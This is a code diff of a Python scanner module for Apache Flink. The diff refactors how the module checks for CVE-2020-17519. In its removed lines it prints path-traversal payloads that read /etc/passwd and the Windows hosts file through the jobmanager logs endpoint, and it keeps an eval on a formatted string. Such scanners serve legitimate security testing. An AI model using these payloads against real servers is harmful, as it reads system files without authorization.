@@ -9,38 +9,20 @@ file:///etc/passwd
 file:///C:\Windows\System32\drivers\etc\hosts
 '''
 
-from lib.initial.config import config
-from lib.tool.md5 import md5
+# from lib.initial.config import config
 from lib.tool.thread import thread
 from payloads.ApacheFlink.cve_2020_17519 import cve_2020_17519_scan
 
 class Flink():
     def __init__(self):
-        self.timeout = config.get('timeout')
-        self.headers = config.get('headers')
-        self.proxies = config.get('proxies')
-
         self.app_name = 'ApacheFlink'
-        self.md = md5(self.app_name)
-        self.cmd = 'echo ' + self.md
 
-        self.cve_2020_17519_payloads = [
-            {
-                'path': 'jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
-                'data': ''
-            },
-            {
-                'path': 'jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fC:%252fWindows%252fSystem32%252fdrivers%252fetc%252fhosts',
-                'data': ''
-            }
-        ]
-
-    def addscan(self, url, vuln=None):
+    def addscan(self, clients, vuln=None):
         if vuln:
-            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
+            return eval('thread(target=self.{}_scan, clients=clients)'.format(vuln))
 
         return [
-            thread(target=self.cve_2020_17519_scan, url=url)
+            thread(target=self.cve_2020_17519_scan, clients=clients)
         ]
 
 Flink.cve_2020_17519_scan = cve_2020_17519_scan
